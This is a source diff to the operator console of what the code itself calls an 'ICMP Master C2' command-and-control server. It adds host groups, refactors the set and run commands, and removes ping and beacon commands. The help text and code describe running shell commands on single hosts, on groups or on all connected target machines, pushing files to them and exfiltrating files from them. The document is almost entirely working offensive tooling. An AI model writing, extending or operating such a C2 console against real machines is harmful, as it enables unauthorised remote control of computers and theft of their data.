@@ -22,6 +22,7 @@
 #include <vector>
 #include <sstream>
 #include <fstream>
+#include <algorithm>
 
 #include <unistd.h>
 #include <sys/types.h>
@@ -37,10 +38,8 @@ enum class user_command_t {
   PD_HELP,
   PD_LIST,
   PD_HOSTS,
+  PD_GROUP,
   PD_SET,
-  PD_PING,
-  PD_PINGH,
-  PD_BEACON,
   PD_RUN,
   PD_RUNALL,
   PD_FILE,
@@ -151,10 +150,8 @@ user_command_t input_to_command(const std::string &input)
   if (input == "help") return user_command_t::PD_HELP;
   if (input == "list") return user_command_t::PD_LIST;
   if (input == "hosts") return user_command_t::PD_HOSTS;
+  if (input == "group") return user_command_t::PD_GROUP;
   if (input == "set") return user_command_t::PD_SET;
-  if (input == "ping") return user_command_t::PD_PING;
-  if (input == "pingh") return user_command_t::PD_PINGH;
-  if (input == "beacon") return user_command_t::PD_BEACON;
   if (input == "run") return user_command_t::PD_RUN;
   if (input == "runall") return user_command_t::PD_RUNALL;
   if (input == "file") return user_command_t::PD_FILE;
@@ -482,6 +479,121 @@ void load_connections(const std::string &filename)
   }
 }
 
+void group(const std::vector<std::string> &input_arr)
+{
+  if (input_arr.size() < 2) {
+    auto it = groups.begin();
+    for (; it != groups.end(); it++) {
+      std::puts(it->first.c_str());
+    }
+    return;
+  }
+  auto &sub_cmd = input_arr.at(1);
+  if (sub_cmd == "add") {
+    if (input_arr.size() < 4) {
+      std::puts("usage: add [group] [host]");
+      return;
+    }
+    auto &group_name = input_arr.at(2);
+    auto &host_name = input_arr.at(3);
+    if (groups.find(group_name) == groups.end()) {
+      groups[group_name] = std::vector<std::string>{ host_name };
+    } else {
+      groups.at(group_name).emplace_back(host_name);
+    }
+    return;
+  }
+  if (sub_cmd == "rm") {
+    if (input_arr.size() < 4) {
+      std::puts("usage: rm [group] [host]");
+      return;
+    }
+    auto &group_name = input_arr.at(2);
+    auto &host_name = input_arr.at(3);
+    if (groups.find(group_name) == groups.end()) {
+      std::puts("group not found");
+    } else {
+      auto &group = groups.at(group_name);
+      auto itr = std::find(group.begin(), group.end(), host_name);
+      if (itr != group.end()) group.erase(itr);
+    }
+    return;
+  }
+  if (sub_cmd == "list") {
+    if (input_arr.size() < 3) {
+      std::puts("usage: list [group]");
+      return;
+    }
+    auto &group_name = input_arr.at(2);
+    if (groups.find(group_name) == groups.end()) {
+      std::puts("group not found");
+    } else {
+      auto group = groups.at(group_name);
+      for (auto host : group) {
+        std::puts(host.c_str());
+      }
+    }
+    return;
+  }
+}
+
+void set(const std::vector<std::string> &input_arr)
+{
+  // set host to execute commands
+  if (input_arr.size() < 2) {
+    std::puts("usage: set [host]");
+    return;
+  }
+  if (active_connections.find(input_arr.at(1)) != active_connections.end()) {
+    cur_host = input_arr.at(1);
+    cur_group.clear();
+  } else if (groups.find(input_arr.at(1)) != groups.end()) {
+    cur_group = input_arr.at(1);
+    cur_host.clear();
+  } else {
+    std::puts("group nor active connection exists!");
+  }
+}
+
+void run(const std::vector<std::string> &input_arr)
+{
+  // run a command on a host by hostname
+  if (input_arr.size() < 2) {
+    std::puts("usage: run [command]");
+    return;
+  }
+
+  std::string command;
+  for (int i = 1; i < input_arr.size(); i++) {
+    command.append(input_arr.at(i));
+    if (i != input_arr.size() - 1) {
+      command.append(" ");
+    }
+  }
+
+  if (!cur_host.empty()) {
+    std::string ip = active_connections[cur_host];
+    std::cout << "Running command \"" << command << "\" on "
+              << ip
+              << "\n";
+    send_command(ip, command);
+  } else if (!cur_group.empty()) {
+    auto &group = groups.at(cur_group);
+    for (auto &host : group) {
+      if (active_connections.find(host) == active_connections.end()) {
+        continue;
+      }
+      std::string ip = active_connections[host];
+      std::cout << "Running command \"" << command << "\" on "
+                << ip
+                << "\n";
+      send_command(ip, command);
+    }
+  } else {
+    std::puts("no group or host selected!");
+  }
+}
+
 std::ostream &operator<<(std::ostream &os, const host_mapping_t &mapping)
 {
   auto it = mapping.begin();
@@ -496,23 +608,21 @@ std::ostream &operator<<(std::ostream &os, const host_mapping_t &mapping)
  */
 void help()
 {
-  std::puts("ICMP Master C2!");
-  std::puts("Current commands:");
-  std::puts("\thelp: display this message");
-  std::puts("\tlist: list active connections");
-  std::puts("\thosts: list all hosts");
-  std::puts("\tset [host]: sets the cur host");
-  std::puts("\tping [ip]: ping an ip");
-  std::puts("\tpingh [host]: ping a host");
-  std::puts("\tbeacon: clears active cache and pings all machines");
-  std::puts("\trun [command]: run a command on a target machine");
-  std::puts("\trunall [command]: runs command on all machines");
-  std::puts("\tfile [src] [dst]: send a file over to host machine");
-  std::puts("\texfil [src] [dst]: receive a file from the host machine");
-  std::puts("\texport [filename]: exports currently connected hosts to file");
-  std::puts("\tload [filename]: loads file to hosts list");
-  std::puts("\tclear: clears currently connected list");
-  std::puts("\texit: exit program!");
+  std::puts("\thelp: displays usable commands");
+  std::puts("\tlist: lists all active connections to the server");
+  std::puts("\thosts: lists expected hosts that are supplied by the database file");
+  std::puts("\tgroup: by default this command lists all groups");
+  std::puts("\t\tadd/rm [group] [host]: adds/removes a host to a group to run commands on");
+  std::puts("\t\tlist [group]: lists all hosts within a group");
+  std::puts("\tset [host/group]: sets the current host to run commands on");
+  std::puts("\trun [command]: runs a command on the currently set host");
+  std::puts("\tfile [src] [dst]: sends a file to the currently set host. src is the file on the server box, and dst is the location on the host machine.");
+  std::puts("\texfil [src] [dst]: exfiltrates a file from the currently set host. src is the location on the server to save the file, and dst is the location of the file on the host to exfiltrate.");
+  std::puts("\trunall [command]: runs a command on all active connections");
+  std::puts("\texport [filename]: export all active connections to a database file");
+  std::puts("\tload [filename]: load a database file of host to ip mappings");
+  std::puts("\tclear: clear the active connections. Useful for testing if connections still exist.");
+  std::puts("\texit: stops the server and exits");
 }
 
 /**
@@ -541,7 +651,7 @@ int main(int argc, char **argv)
   // begin command loop
   while (1) {
     std::string input;
-    std::cout << cur_host << " > ";
+    std::cout << (cur_host.empty() ? cur_group : cur_host) << " > ";
     std::getline(std::cin, input);
 
     if (input.empty()) {
@@ -572,71 +682,16 @@ int main(int argc, char **argv)
       std::cout << host_database;
       break;
     }
+    case user_command_t::PD_GROUP: {
+      group(input_arr);
+      break;
+    }
     case user_command_t::PD_SET: {
-      // set host to execute commands
-      if (input_arr.size() < 2) {
-        std::puts("usage: set [host]");
-        continue;
-      }
-      if (active_connections.find(input_arr.at(1)) == active_connections.end()) {
-        std::puts("host not connected!");
-        continue;
-      }
-      cur_host = input_arr.at(1);
-      break;
-    }
-    case user_command_t::PD_PING: {
-      // ping an individual host by ip
-      if (input_arr.size() < 2) {
-        std::puts("usage: ping [ip]");
-        continue;
-      }
-      ping(input_arr.at(1));
-      std::cout << "Sending ping to: " << input_arr.at(1) << "\n";
-      break;
-    }
-    case user_command_t::PD_PINGH: {
-      // ping an individual host by hostname
-      if (input_arr.size() < 2) {
-        std::puts("usage: pingh [host]");
-        continue;
-      }
-      std::string ip = active_connections[input_arr.at(1)];
-      ping(ip);
-      std::cout << "Sending ping to: " << ip << "\n";
-      break;
-    }
-    case user_command_t::PD_BEACON: {
-      // send a ping to all hosts in the host file
-      std::lock_guard<std::mutex> guard(active_connections_mutex);
-      active_connections.clear();
-      auto it = host_database.begin();
-      for (; it != host_database.end(); it++) {
-        std::cout << "Beaconing: " << it->second << "\n";
-        ping(it->second);
-      }
+      set(input_arr);
       break;
     }
     case user_command_t::PD_RUN: {
-      // run a command on a host by hostname
-      if (input_arr.size() < 2) {
-        std::puts("usage: run [command]");
-        continue;
-      }
-
-      std::string ip = active_connections[cur_host];
-      std::string command;
-      for (int i = 1; i < input_arr.size(); i++) {
-        command.append(input_arr.at(i));
-        if (i != input_arr.size() - 1) {
-          command.append(" ");
-        }
-      }
-
-      std::cout << "Running command \"" << command << "\" on "
-                << ip
-                << "\n";
-      send_command(ip, command);
+      run(input_arr);
       break;
     }
     case user_command_t::PD_RUNALL: {
